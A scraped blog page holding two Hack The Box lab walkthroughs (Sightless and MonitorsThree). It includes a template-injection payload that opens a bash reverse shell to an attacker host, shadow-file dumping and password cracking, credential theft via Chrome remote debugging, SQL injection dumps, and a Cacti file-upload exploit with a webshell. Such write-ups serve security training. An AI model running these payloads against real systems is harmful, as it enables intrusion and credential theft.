sudo ufw allow from $RADDR to any port 53 proto tcp bash sudo socat -d TCP-LISTEN:53 STDOUT {{ process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.48/53 0&gt;&amp;1&#39;) }} That didn&rsquo;t work. Thankfully, it didn&rsquo;t take too much fiddling to get it to open a shell:
{{ process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ4LzUzIDA+JjE=|base64 -d|bash -i&#39;) }} &#x261d;&#xfe0f; That&rsquo;s just the base64 encoded version of the previous bash reverse shell.
And we catch a shell!
We&rsquo;re already root, so chances are extremely high that we&rsquo;re just in a docker container.
USER FLAG Local enumeration - sqlpad Adjacent to where we opened the reverse shell, there&rsquo;s an SQLite definition file, sqlpad.sqlite. Exfil this file by whatever means is convenient (I used cat sqlpad.sqlite | base64 -w 0, copied the outpud, pasted it into a local file, then decoded it into another file)
sqlite3 sqlpad.sqlite .tables .schema users .headers on .mode table select email, role, name, passhash, password_reset_id, data from users; Interesting - the admin user has a password hash, but john only has a password_reset_id. Let&rsquo;s attempt to crack the hash:
name-that-hash -t &#39;$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC&#39; The hash is probably bcrypt, as expected. Now let&rsquo;s put it in a file and crack it:
echo &#39;admin:$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC&#39; &gt; sqlpad.hash PASSWDS=/usr/share/wordlists/rockyou.txt john --wordlist=$PASSWDS --format=bcrypt sqlpad.hash I tried that credential on both FTP/S and SSH, but neither was successful. In SQLPad itself, we&rsquo;re already logged in with full access, so there&rsquo;s probably no need to escalate privilege there (plus, I don&rsquo;t see any way to even log out and change users&hellip;)
Enumerating the SQLPad host a little more, I noticed that (oddly) there are two more users on the box: michael and node, each with a home directory. While neither home directory held anything important, this reminded me that I should check the shadowfile! &#x1f4a1;
cat /etc/shadow root and michael each have a password hash, so I&rsquo;ll copy those into a file on my attacker host:
PASSWDS=/usr/share/wordlists/rockyou.txt john --wordlist=$PASSWDS sqlpad-shadow.hash Great! There&rsquo;s two more credentials:
root : blindside michael : insaneclownposse Before I do anything else, I&rsquo;ll check all combinations of known usernames and passwords against FTP/S and SSH:
OK, none of them worked for FTP/S. What about SSH?
ssh michael@$RADDR # use password &#34;insaneclownposse&#34; &#x1f44f; Excellent - the first credential I tried worked perfectly!
Although we can&rsquo;t immediately privesc using the password blindside, we now have access to the user flag. Go read it for some points:
cat /home/michael/user.txt ROOT FLAG Local enumeration - michael michael can&rsquo;t sudo anything, and the only human users on the target are michael, john, and root.
We can see several services exposed locally by running netstat:
Listening services To take a look at these, I&rsquo;ll establish a SOCKS proxy.
Chisel SOCKS Proxy During user enumeration I found a locally-exposed port 5432 (probably PostgreSQL). To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: if you&rsquo;ve never used proxychains, go find a guide for how to install and configure it.
sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse Then, on the target machine, start up the chisel client and background it. (Note that I&rsquo;ve already transferred a precompiled copy of chisel to the target by downloading from my attacker host&rsquo;s http server):
./chisel client 10.10.14.2:9999 R:1080:socks &amp; To test that it worked, I tried a round-trip test (attacker -&gt; target -&gt; attacker) to access loading the index page from my attacker host&rsquo;s http server:
proxychains curl http://10.10.14.2:8000 I can see the html for my http server&rsquo;s index page, so this is a success &#x1f44d;
Now I can comfortably access any of the http-based services running on the target. I already have FoxyProxy configured to use SOCKS5:
So now we can access the target&rsquo;s port 3000 by navigating to http://localhost:3000:
As we just saw, port 3000 is running SQLPad. We can also check out port 8080 and note that it&rsquo;s running Froxlor (albeit unconfigured):
Apache configs After trying all known credentials against the MySQL database (none worked), it seems like the best option is to look through the filesystem for some database credentials. Usually, a good place to check is within web apps, but it seems like I can only access the sightless.htb www root:
Since we&rsquo;re clearly in the host system now, if there are other domains to investigate, they would necessarily have to be defined as vhosts - so it makes sense to check for vhost configurations. I uncovered a key detail in the Apache config at /etc/apache2/sites-enabled/000-default.conf:
&lt;VirtualHost 127.0.0.1:8080&gt; ServerAdmin webmaster@localhost DocumentRoot /var/www/html/froxlor ServerName admin.sightless.htb ServerAlias admin.sightless.htb ErrorLog \${APACHE_LOG_DIR}/error.log CustomLog \${APACHE_LOG_DIR}/access.log combined &lt;/VirtualHost&gt; I removed the commented lines for clarity
&#x1f4a1; Aha! Much earlier, during subdomain enumeration, I had been searching for admin.sightless.htb. Turns out it existed all along, but was only exposed locally.
We already saw port 8080 through the SOCKS proxy, but it might look different if we provide a Host header, thus accessing the vhost defined in the above Apache config. I&rsquo;ve adjusted my /etc/hosts to look like this:
10.129.228.54 sightless.htb 10.129.228.54 sqlpad.sightless.htb 127.0.0.1 admin.sightless.htb As predicted, we now see something totally different when accessing port 8080 by its hostname:
I tried all known pairs of credentials on this login page, but none were successful. I also tried the Forgot your password? feature, hoping that it might send an email to /var/mailbut that didn&rsquo;t work either.
Scheduled processes We can check PSpy for a hint at what the john user does. It seems they are the main administrator of Froxlor, and have several scheduled processes running (here are some, in no particular order):
We can see from these lines that healthcheck.sh and administration.py are running periodically, from /home/john/automation, and that some of the results of these scripts involve privilege escalation. It also reveals that the froxlor user is froxlorlocal.
What&rsquo;s really interesting (and I can&rsquo;t understand why this would happen automatically) is that john is utilizing the chromedriver to access Floxor:
Remote Debugging Searching for &ldquo;Chrome remote debugging&rdquo; brought me to this article by Google that explains how to set up Chrome for remote debugging. In short, I&rsquo;ll need to add http addresses for whatever the remote debugging port is. I know it&rsquo;s not 8080 or 3306 (or 33060, but it could be any of the other ports exposed to 127.0.0.1:
Also, since I&rsquo;ll need to access these ports through Chrome (which I haven&rsquo;t yet configured for SOCKS5 proxy), I&rsquo;ll perform the port forwards by using SSH itself:
ssh michael@$RADDR \\ -L 8080:localhost:8080 \\ -L 3306:localhost:3306 \\ -L 34579:localhost:34579 \\ -L 3000:localhost:3000 \\ -L 37011:localhost:37011 \\ -L 57675:localhost:57675 \\ -L 33060:localhost:33060 I&rsquo;ll set up Chrome&rsquo;s remote debugging on my attacker host by connecting to all these ports. Navigate to chrome://inspect/#devices, click Configure, then add each port:
After clicking Done, one of the ports connects, and some options appear:
Click Inspect, and a window appears as if we had opened the Chrome Dev Tools on the remote debugging session!
&#x1f911; We&rsquo;re looking directly at John&rsquo;s automated chrome session! We can watch john enter their credentials and check the System log page over and over.
Since we have Dev Tools open, why not just observe the login POST body? All it takes is pausing the Network tab right after the login occurs:
Perfect! From the POST index.php request, we can read the credentials directly. They&rsquo;re using admin : ForlorfroxAdmin
Back in the original tab I had open for admin.sightless.htb, I&rsquo;ll try logging in using those credentials:
The login is successful, and we can start exploring the Froxlor dashboard ourselves:
Froxlor Dashboard This dashboard has a lot of features. We have the ability to manage domains, change PHP settings, renew certificates - all kinds of activities that are helpful with webserver administration. Not only that, but as an admin user we can do all of that plus edit the settings of Froxlor itself.
We can also see that john, the other user on the target host, is the customer linked to web1.
I don&rsquo;t see any ways to directly gain RCE as another user. There are probably ways to insert webshells from here, but it will take a bit of playing-around to determine that &#x1f914;
web1 &#x1f6ab; This section didn&rsquo;t lead anywhere directly, but I might pick it up later. Skip to the next section if you&rsquo;re in a hurry.
Looking through Froxlor, it seems like there&rsquo;s only one domain registered - web1. We saw this mentioned earlier under /var/customers and in the apache configs. Here&rsquo;s one of the configs that mentioned it (looks like this apache config is auto-generated by Froxlor):
# 34_froxlor_normal_vhost_web1.sightless.htb.conf # Created 03.09.2024 11:55 # Do NOT manually edit this file, all changes will be deleted after the next domain change at the panel. # Domain ID: 1 - CustomerID: 1 - CustomerLogin: web1 &lt;VirtualHost 192.168.1.118:80&gt; ServerName web1.sightless.htb ServerAlias *.web1.sightless.htb ServerAdmin john@sightless.htb DocumentRoot &#34;/var/customers/webs/web1&#34; &lt;Directory &#34;/var/customers/webs/web1/&#34;&gt; &lt;FilesMatch \\.(php)$&gt; &lt;If &#34;-f %{SCRIPT_FILENAME}&#34;&gt; SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-web1-web1.sightless.htb-php-fpm.socket|fcgi://localhost &lt;/If&gt; &lt;/FilesMatch&gt; CGIPassAuth On Require all granted AllowOverride All &lt;/Directory&gt; Alias /goaccess &#34;/var/customers/webs/web1/goaccess&#34; LogLevel warn ErrorLog &#34;/var/customers/logs/web1-error.log&#34; CustomLog &#34;/var/customers/logs/web1-access.log&#34; combined &lt;/VirtualHost&gt; I&rsquo;ll try taking a look at it:
The address that web1 is mapped to doesn&rsquo;t seem to exist &#x1f914;
FTP If desired, we can also assume the perspective of any user by going to Resources &gt; Customers then clicking on the customer&rsquo;s username. Interestingly, it seems like this is the only way to make the FTP options appear:
We can edit this entry, and freely change the password. I&rsquo;ll use web1 : web1.FTP. Is this what we needed to be able to access FTP?
lftp -e &#34;set ssl:verify-certificate no&#34; $RADDR &gt; login web1 web1.FTP That worked - we can now see inside the web1 FTP:
We can use get to obtain /goaccess/backup/Database.kdb. ​A quick check of file shows that this is a Keepass database.
I&rsquo;ve used Keepass a little bit, during Keeper in HTB&rsquo;s Season 2. Check out that portion of my walkthrough of Keeper for a little more context.
I remember that there is a handy utility for turning a keepass database&rsquo;s master key into a hash that john can crack:
keepass2john Database.kdb &gt; keepass.hash PASSWDS=/usr/share/wordlists/rockyou.txt john --wordlist=$PASSWDS keepass.hash Since this is a Keepass v1 file, we&rsquo;ll need to use keepassxc to open it (or use Windows):
sudo apt install keepassxc Once installed, we can&rsquo;t just open the kdb file, we need to import it instead. Choose Database &gt; Import&hellip; then select KDB file, and choose the Database.kdb file previously obtained through FTP:
Finish importing the database, and you&rsquo;ll see there&rsquo;s only one key, called ssh / root:
That&rsquo;s great, but the real loot is saved as an attachment. Click on the Advanced tab in the details panel:
I&rsquo;ll save the id_rsa file to my attacker host. As usual, I&rsquo;ll chmod 600 the file to restrict permissions adequately to use the file for SSH authentication:
&#x1f631; Uh-oh! That error usually indicates there&rsquo;s something wrong with the key format. Thankfully, I have a bunch of other keys on hand that I can compare it to:
cp ../../[Other box name]/loot/id_rsa ./reference_id_rsa diff ./id_rsa ./reference_id_rsa Besides the difference in key content, we can see from diff that the file we just saved is lacking a newline character on the end. Add one to fix up the formatting:
echo -e &#34;\\x0a&#34; &gt;&gt; ./id_rsa Check your work with hexedit, then attempt to log in again:
ssh -i ./id_rsa root@$RADDR There&rsquo;s the root flag! Read it to finish off the box:
cat /root/root.txt &#x1f389; Congratulations - that root flag was a lot tougher than I thought it would be!
EXTRA CREDIT I would love to take a second look at this box, to answer a couple questions I had along the way:
Is there another way to gain credentials for the Froxlor dashboard? The Chrome remote debugging thing was quite a strange idea to me, and seems very niche. Is there a more generalizable way to either bypass authentication or gain credentials? How else could I have gained a root shell? I&rsquo;d be interested to see if I could at least pivot to the john user by exploiting Froxlor. We saw that the dashboard has the ability to define new domains that use PHP-FPM, so could I have opened a webshell as john that way? Unfortunately, other &ldquo;real life&rdquo; priorities are preventing me from playing around with this box any further. I&rsquo;ll be eager to check out other people&rsquo;s solutions once this box retires!
CLEANUP Target As root, I&rsquo;ll get rid of the spot where I place my tools on the target:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf loot/* It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x267b;&#xfe0f; Enumerate, fingerprint, exploit. I did a good job on this box gaining a quick foothold, and I need to remember to follow this methodology going forward. Do some recon, figure out the versions of which services are running, do a little vulnerability research, and try to exploit right away. By staying focussed, you&rsquo;ll hopefully avoid wasting time (re)discovering vulnerabilities that already have a CVE assigned.
&#x1f955; Root already? Grab the shadowfile. If you&rsquo;ve already gained root access, and need to pivot to another host (whether that&rsquo;s the docker host, or something else on the same network, etc) be sure to grab the shadowfile. Obtain /etc/shadow, and optionally get /etc/passwd and run the unshadow utility (comes with john). After that, you can start cracking.
&#x1f511; Double check key format. I accidentally got a little hung of on the format of the SSH key for root that we recovered from the Keepass database. As we saw, it was lacking a newline character at the bottom. Using diff to compare the recovered key to one I had on-hand (with the same length &amp; algorithm) made it very easy to see what the problem was.
Defender &#x1f501; Password re-use between containers and host is both lazy and harmful. Not only that, the whole idea of it is problematic: we containerize applications to that the resulting container does just one thing, and scales nicely. Why would we have a regular user (one that we would presumably re-use a credential for) in a container? Just make a service account for the containerized application instead.
&#x1f4c9; Beware downgrading your security through poor key management. On this box, we eventually recovered the SSH private key for root from a Keepass database. Taken by itself, that&rsquo;s not the worst practice - but it the keypass database should have itself been locked with a proper cryptographic-strength key. Instead, it was locked with a very weak password, downgrading the security of the root SSH authentication to using (weak) password instead of being key-based.
`,url:"https://4wayhandshake.github.io/walkthrough/sightless/"},"https://4wayhandshake.github.io/walkthrough/monitorsthree/":{title:"MonitorsThree",tags:["SQL Injection","Insecure File Upload","Cacti","Password Cracking","Authentication Bypass","Duplicati","Passing the Hash","SSH Keys","Docker"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION MonitorsThree was released as the fourth box of HTB&rsquo;s season 6, Heist. It&rsquo;s an interesting addition to the &ldquo;Monitors&rdquo; line of boxes, all of which prominently feature the Cacti monitoring tool. This box took a little bit of research to complete, but was generally on the easier side of &ldquo;medium&rdquo;.
Recon was almost nonessential. Once you discover the cacti subdomain, you&rsquo;re ready to proceed. Fingerprint the two apps you&rsquo;ve discovered, then check out the main monitorsthree app in more detail. The site has a couple forms on it; running a popular tool to abuse these forms is enough to get you started on a foothold. From there, you&rsquo;ll discover a credential leading you back to the cacti web app. A little bit of vulnerability research goes a long way here. By exploiting a well known vulnerability (with well-documented PoC), you&rsquo;ll gain an easy foothold.
After gaining a foothold, checking out the databases is key. Either filesystem enumeration or some simple guesswork will grant you access to the database. Inside are some password hashes. Crack them and pivot to the low-privilege user to grab the user flag.
More filesystem enumeration will yield some sensitive configs for a service listening locally. Once you find some juicy-looking info, start doing some vulnerability research related to that info and you&rsquo;ll surely find the correct method for accessing the service. After gaining access to that service, you have several options for privesc. Be creative and try whatever works for you. Note that the service is a little flaky, so multiple attempts of the same thing might be required.
This box was interesting, but actually pretty straightforward. I spent most of my time trying to work around the unreliable/buggy aspects of services on this box; other than that, it was good fun.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8084/tcp filtered websnp Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA) |_ 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://monitorsthree.htb/ 8084/tcp filtered websnp Note the redirect to http://monitorsthree.htb.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No result
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 9/udp open|filtered tcpwrapped 53/udp open|filtered domain 68/udp open|filtered tcpwrapped 88/udp open|filtered kerberos-sec 111/udp open|filtered rpcbind 123/udp open|filtered ntp 139/udp open|filtered tcpwrapped 623/udp open|filtered asf-rmcp 996/udp open|filtered tcpwrapped 1030/udp open|filtered iad1 2222/udp open|filtered tcpwrapped 49185/udp open|filtered unknown 49200/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Domain enumeration Noting the redirect from the nmap scan, I added monitorsthree.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=template.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR No surprises there. It&rsquo;s using Ubuntu and a recent version of nginx.
Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from that. Next I&rsquo;ll check for subdomains of monitorsthree.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v We&rsquo;ve discovered the cacti.monitorsthree.htb subdomain. I&rsquo;ll add that to the /etc/hosts file too, then:
echo &#34;$RADDR cacti.$DOMAIN&#34; | sudo tee -a /etc/hosts No new results from that. I&rsquo;ll move on to directory and file enumeration on http://monitorsthree.htb.
&#x1f550; I don&rsquo;t see much of a point in enumerating Cacti. It&rsquo;s an open-source project; I could easily infer the directories and files just by looking through their repo on Github.
Directory enumeration First, directory enumeration:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v -fs 13560 Let&rsquo;s quickly check the /admin directory too:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/admin/FUZZ -t 60 -c -o fuzzing/ffuf-directories-root-admin -of json -timeout 4 -v -ic -fs 13560 File enumeration Next I&rsquo;ll search for files in the /admin directory:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -c -o fuzzing/ffuf-files-root -of json -e .php,.js,.html,.txt -timeout 4 -v It&rsquo;s a little odd that we can access certain components. We&rsquo;ll check that out soon.
Just for completeness, let&rsquo;s also check for files in the /admin/assets directory:
Exploring monitorsthree.htb The website at http://monitorsthree.htb seems to be a typical landing page for an IT services company. There isn&rsquo;t anything really notable on the index page. There are a couple testimonials (with names and business names), and a link to /login.php
The /login.php page doesn&rsquo;t have any way to register a new user. However, there is a forgot_password.php page where we can request a password reset. After trying a few obvious usernames, it seems like we would be able to enumerate usernames by fuzzing this form (3380 bytes):
Here&rsquo;s a positive result (3385 bytes):
What about those UI components that we got an HTTP 200 on, during file enumeration? db.php didn&rsquo;t have any useful info, but navbar.php gives a bit of a preview of the admin dashboard contents:
Login Form - quick tests For a very succinct strategy on testing login forms, check out my page on that topic.
SQLi Auth Bypass WLIST=/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt ffuf -w $WLIST:FUZZ -u http://monitorsthree.htb/login.php -r -X POST -t 40 -c \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;PHPSESSID=hiddedbuopbr2qdmcldg9srnnh&#34; \\ -d &#34;username=FUZZ&amp;password=password123&#34; \\ -fr &#39;Login to your account&#39; No result.
Password guessing WLIST=/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt ffuf -w $WLIST:FUZZ -u http://monitorsthree.htb/login.php -r -X POST -t 40 -c \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;PHPSESSID=hiddedbuopbr2qdmcldg9srnnh&#34; \\ -d &#34;username=admin&amp;password=FUZZ&#34; \\ -fr &#39;Login to your account&#39; Also no result.
Exploring cacti.monitorsthree.htb I think everyone reading this knows that the real clues are almost always in whatever subdomain you discover &#x1f609;
I never did Monitors. In MonitorsTwo, though, the foothold was gained by exploiting Cacti. I&rsquo;m hoping this one will be no different. Feel free to read my walkthrough on MonitorsTwo for some context.
As expected, navigating to http://cacti.monitorsthree.htb brings us to the login page for Cacti:
Vulnerability research We can see the version is now 1.2.26. While I didn&rsquo;t see anything in searchsploit, doing a web search for &ldquo;Cacti 1.2.26 vulnerability exploit PoC&rdquo; led to a plethora of results hinting at vulnerabilities that can lead to RCE:
Authenticated insecure upload by /lib/import.php (CVE-2024-25641) Authenticated SQLi via the filter parameter of api_automation.php (CVE-2024-31445) Unauthenticated RCE when PHP parameter register_argc_argv is set to on (CVE-2024-29895) Unauthenticated file inclusion in /lib/plugin.php (CVE-2024-25641) Two of these are authenticated, two are unauthenticated.
FOOTHOLD CVE-2024-29895 I&rsquo;ll check that unauthenticated RCE first - it looks very easy to test, and the result is too good to be true
sudo ufw allow from $RADDR to any port 8000 proto tcp cd www simple-server 8000 -v &amp; curl &#39;http://cacti.monitorsthree.htb/cacti/cmd_realtime.php?1+1&amp;&amp;wget+http://10.10.14.30:8000+1+1+1&#39; curl &#39;http://cacti.monitorsthree.htb/cacti/cmd_realtime.php?1+1&amp;&amp;curl+http://10.10.14.30:8000+1+1+1&#39; curl &#39;http://cacti.monitorsthree.htb/cacti/cmd_realtime.php?1+1&amp;&amp;nc+10.10.14.30+8000+1+1+1&#39; curl &#39;http://cacti.monitorsthree.htb/cacti/cmd_realtime.php?1+1&amp;&amp;sleep+10+1+1+1&#39; Nope, nothing.
CVE-2024-25641 I tried exploiting this vulnerability, using a very similar method to the PoC shown on github, but was ultimately unsuccessful; I&rsquo;m not sure why.
If I run out of ideas, I might revisit this later &#x1f6a9;
SQLi - monitorsthree.htb We&rsquo;ve already identified a couple forms on the website. Just to get the obvious out of the way, I also already tried some easy brute-forcing and some very quick-to-test SQLi auth bypasses. But what about a more comprehensive test of SQLi?
We saw from file enumeration that there is a db.php file, so there&rsquo;s a chance that the backend is running some kind of SQL database. If so, there&rsquo;s also a chance they introduced an SQLi vulnerability.
To test both forms in one command, I&rsquo;ll use --crawl &#x1f447;
sqlmap -u &#39;http://monitorsthree.htb/login.php&#39; --crawl=2 --random-agent --batch --forms --threads=5 &#x1f62e; After slightly less than 5 minutes, a positive result was returned for the POST /forgot_password.php form:
Alright! Let&rsquo;s start enumerating the DB. First, get the name of the current database:
sqlmap -u &#39;http://monitorsthree.htb/forgot_password.php&#39; --data &#39;username=test&#39; -p &#39;username&#39; --batch --current-db monitorsthree_db current database: &#39;monitorsthree_db&#39; Now let&rsquo;s find the names of the tables:
sqlmap -u &#39;http://monitorsthree.htb/forgot_password.php&#39; --data &#39;username=test&#39; -p &#39;username&#39; --batch -D &#39;monitorsthree_db&#39; --tables Database: monitorsthree_db [6 tables] +---------------+ | changelog | | customers | | invoice_tasks | | invoices | | tasks | | users | +---------------+ The users table is a great place to start. This is taking a long time, so I&rsquo;d like to minimize how much time I spend reading tables - let&rsquo;s get the column names:
sqlmap -u &#39;http://monitorsthree.htb/forgot_password.php&#39; --data &#39;username=test&#39; -p &#39;username&#39; --batch -D &#39;monitorsthree_db&#39; -T &#39;users&#39; --columns Database: monitorsthree_db Table: users [9 columns] +------------+---------------+ | Column | Type | +------------+---------------+ | name | varchar(100) | | position | varchar(100) | | dob | date | | email | varchar(100) | | id | int(11) | | password | varchar(100) | | salary | decimal(10,2) | | start_date | date | | username | varchar(50) | +------------+---------------+ id, username and password are probably enough to get me further access.
&#x261d;&#xfe0f; If I can log in using any of these creds, maybe one of them will be an admin and I won&rsquo;t need to keep performing this time-based blind SQLi.
sqlmap -u &#39;http://monitorsthree.htb/forgot_password.php&#39; --data &#39;username=test&#39; -p &#39;username&#39; \\ --batch -D &#39;monitorsthree_db&#39; -T &#39;users&#39; -C &#39;id,username,password&#39; --dump In retrospect I already knew that admin was a valid user. I should have used the --sql-query option in SQLmap to obtain the password for that user only. This would have been much faster (12.8 minutes, instead of several hours)
Database: monitorsthree_db Table: users [4 entries] +----+-----------+----------------------------------+ | id | username | password | +----+-----------+----------------------------------+ | 2 | admin | 31a181c8372e3afc59dab863430610e8 | | 5 | mwatson | c585d01f2eb3e6e1073e92023088a3dd | | 6 | janderson | 1e68b6eb86b45f6d92f8f292428f77ac | | 7 | dthompson | 633b683cc128fe244b00f176c8a950f5 | +----+-----------+----------------------------------+ Note: the above SQLi took almost 6 hours to complete. I might investigate a faster method for the SQLi.
Thankfully, these are MD5 hashes, so they should be really fast to crack. I put the hashes into a file with their usernames:
I double-checked the format using name-that-hash, then started cracking:
PASSWDS=/usr/share/wordlists/rockyou.txt john --wordlist=$PASSWDS --format=raw-md5 monitorsthree_db_users.hash Only one of the hashes was cracked by rockyou, but at least it was the admin password! Now we know that admin : greencacti2001 should work for the login to the admin dashboard at http://monitorsthree.htb/login.php, but before I forget, I should also test it with:
SSH, on port 22 Cacti, at http://cacti.monitorsthree.htb/cacti Testing credential re-use First, I&rsquo;ll check SSH:
I think it&rsquo;s pretty safe to assume that password-based authentication is disabled globally on the target. Therefore, there will be no credential re-use.
Next, I&rsquo;ll check Cacti:
&#x1f44f; Perfect - the admin : greencacti2001 credentials work for Cacti. That means I can go try out those other two CVEs that require authentication! I&rsquo;ll take a quick look at the main app at http://monitorsthree.htb then try out those CVEs.
MonitorsThree admin dashboard Not a security concern, but I see under the Invoices that the person in charge of (I guess&hellip; &ldquo;accounts receivable&rdquo;?) is Marcus Higgins.
The Users section appears to be a reflection of the users table from the database:
The Changelog seems like it should hold some hints, but the only actionable hint is about Users, and isn&rsquo;t even true:
Introduced a user management section to display and manage current users of the web app. Admins can view active users and manage user roles
Maybe we&rsquo;re looking at version 1.3 still? &#x1f937;&zwj;&#x2642;&#xfe0f;
Cacti CVEs Now that we have a valid login for Cacti, there&rsquo;s much better chance that we can actually utilize those two CVEs with &ldquo;authenticated&rdquo; exploits.
Since the insecure upload one (CVE-2024-25641) would more directly yield a foothold, I&rsquo;ll try that first.
The vulnerability disclosure provides its own PoC. It&rsquo;s not a self-contained script PoC; it&rsquo;s more like a walkthrough on how to reproduce an exploit. While it would be totally viable to produce our own PoC code for this one, it turns out that there are already a few good ones on Github.
If we did want to go through the exercise of writing a PoC though, we could do this:
Write or obtain a PHP payload - a simple webshell is probably fine
Use the PoC PHP script to bundlethe payload into a module installable by Cacti
Deliver the payload via the authenticated upload endpoint.
* Remember to obtain the anti-CSRF token: at least two web requests are required to deliver the payload, then one more to trigger it.
Conceptually, pretty easy! &#x1f609;
Let&rsquo;s try out the PoC by @5ma1l for CVE-2024-25641. I&rsquo;ll use the phpbash webshell as a payload. Since the exploit is written in python, I&rsquo;ll set up a venv:
cd exploit python -m venv . &amp;&amp; source bin/activate git clone https://github.com/5ma1l/CVE-2024-25641 cd CVE-2024-25641 pip3 install -r requirements.txt PAYLOAD=/usr/share/webshells/php/phpbash.php python3 exploit.py -p $PAYLOAD &#39;http://cacti.monitorsthree.htb/cacti&#39; &#39;admin&#39; &#39;greencacti2001&#39; The exploit uses a predictable hardcoded filename for the uploaded file. Let&rsquo;s mix it up a little by changing the filename to something less likely for a fuzzer to find:
sed -i &#39;s/test\\.php/dkajfhaskljgfas\\.php/g&#39; exploit.py Alright, let&rsquo;s run the exploit:
PAYLOAD=/usr/share/webshells/php/phpbash.php python3 exploit.py -p $PAYLOAD &#39;http://cacti.monitorsthree.htb/cacti&#39; &#39;admin&#39; &#39;greencacti2001&#39; Since I&rsquo;m using a webshell, I&rsquo;ll navigate there myself any check the result (so I answered n at the final prompt)
Success! After looking around for a minute or so, I realized there is a cleanup script running very frequently, so I&rsquo;ll need to use a reverse shell anyway. Let&rsquo;s start a listener:
sudo ufw allow from $RADDR to any port 53 bash sudo nc -lvnp 53 Now I&rsquo;ll upload the webshell again, then use it to start a reverse shell (simply uploading a reverse shell without using a reverse shell would have been even faster).
&#x1f389; Alright! We have a foothold
USER FLAG Upgrade the shell For an explanation of this, please check out my guide on upgrading the shell.
SHELL=/bin/bash script -q /dev/null [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 Then some stuff just for comfort:
alias ll=&#39;ls -lah&#39; mkdir -p /tmp/.Tools Local enumeration - www-data One of the first things I like to do when I gain a foothold is to check out the code of the thing that granted me the foothold. In our case, that&rsquo;s the two web apps:
monitorsthree, at /var/www/html/app cacti, at /var/www/html/cacti What services are listening? I checked netstat:
Port 8200 TCP port 8200 is unexpected. Trying the port with nc reveals that it&rsquo;s definitely listening for http traffic&hellip; &#x1f914;
A little web searching revealed that port 8200 is commonly used for Hashicorp Vault. We should be able to access this via proxychains:
